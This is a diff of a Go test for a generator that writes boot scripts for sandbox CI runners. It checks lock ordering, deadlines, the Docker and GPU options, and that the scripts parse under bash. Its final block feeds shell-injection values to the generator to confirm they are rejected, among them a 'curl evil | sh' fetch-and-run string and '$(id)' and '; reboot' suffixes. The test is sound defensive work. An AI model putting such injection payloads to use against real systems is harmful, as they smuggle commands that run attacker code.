@@ -161,3 +161,73 @@ func TestWindows(t *testing.T) {
 		}
 	}
 }
+
+// The Daytona script has no power button: every exit path stops PID 1, the
+// sandbox's daemon, and a repeated start backs out before arming that.
+func TestDaytona(t *testing.T) {
+	t.Parallel()
+	boot := testBoot()
+	boot.Env = map[string]string{"GREETING": "hello"}
+	script, err := Daytona(boot, "x64", false)
+	if err != nil {
+		t.Fatal(err)
+	}
+	for _, want := range []string{
+		"mkdir /var/lib/airship-boot", "trap finish EXIT", "kill -TERM 1", "kill -KILL 1",
+		"DEADLINE_SECONDS=3600", "timeout --kill-after=60 \"$DEADLINE_SECONDS\"",
+		"ACTIONS_RUNNER_INPUT_JITCONFIG='" + boot.JITConfig + "'", "actions-runner-linux-${RUNNER_ARCH}-${RUNNER_VERSION}.tar.gz",
+		"base64 -d >> \"$RUNNER_DIR/.env\"", "exec sudo -n bash",
+	} {
+		if !strings.Contains(script, want) {
+			t.Errorf("daytona script lacks %q", want)
+		}
+	}
+	for _, absent := range []string{"shutdown", "dockerd", "nvidia-smi"} {
+		if strings.Contains(script, absent) {
+			t.Errorf("daytona script has %q without being asked", absent)
+		}
+	}
+	// The lock must be taken before the trap is armed, so a second start
+	// exits without stopping the sandbox under the first.
+	if strings.Index(script, "mkdir /var/lib/airship-boot") > strings.Index(script, "trap finish EXIT") {
+		t.Error("the boot lock comes after the trap")
+	}
+	if out, err := exec.CommandContext(context.Background(), "bash", "-n", "-c", script).CombinedOutput(); err != nil {
+		t.Fatalf("boot script does not parse: %v: %s", err, out)
+	}
+
+	boot.GPU = true
+	withDocker, err := Daytona(boot, "arm64", true)
+	if err != nil {
+		t.Fatal(err)
+	}
+	for _, want := range []string{"nvidia-smi -L", "download.docker.com/linux/static/stable/aarch64/docker-" + DockerVersion + ".tgz", "setsid nohup dockerd", "usermod -aG docker runner"} {
+		if !strings.Contains(withDocker, want) {
+			t.Errorf("docker script lacks %q", want)
+		}
+	}
+	if x64, _ := Daytona(boot, "x64", true); !strings.Contains(x64, "/x86_64/docker-") {
+		t.Error("x64 docker download is not x86_64")
+	}
+	if out, err := exec.CommandContext(context.Background(), "bash", "-n", "-c", withDocker).CombinedOutput(); err != nil {
+		t.Fatalf("docker boot script does not parse: %v: %s", err, out)
+	}
+
+	boot = testBoot()
+	boot.MaxLifetimeSeconds = 0
+	if script, _ := Daytona(boot, "x64", false); !strings.Contains(script, "DEADLINE_SECONDS=60") {
+		t.Error("a lifetime of zero must still leave a deadline")
+	}
+	for name, mutate := range map[string]func(*cloud.Boot) string{
+		"jit":     func(b *cloud.Boot) string { b.JITConfig = "abc'; curl evil | sh; '"; return "x64" },
+		"version": func(b *cloud.Boot) string { b.RunnerVersion = "2.338.2; reboot"; return "x64" },
+		"arch":    func(*cloud.Boot) string { return "x64$(id)" },
+		"env":     func(b *cloud.Boot) string { b.Env = map[string]string{"RUNNER_TOKEN": "x"}; return "x64" },
+	} {
+		boot := testBoot()
+		arch := mutate(&boot)
+		if _, err := Daytona(boot, arch, false); err == nil {
+			t.Errorf("%s: unsafe value accepted", name)
+		}
+	}
+}
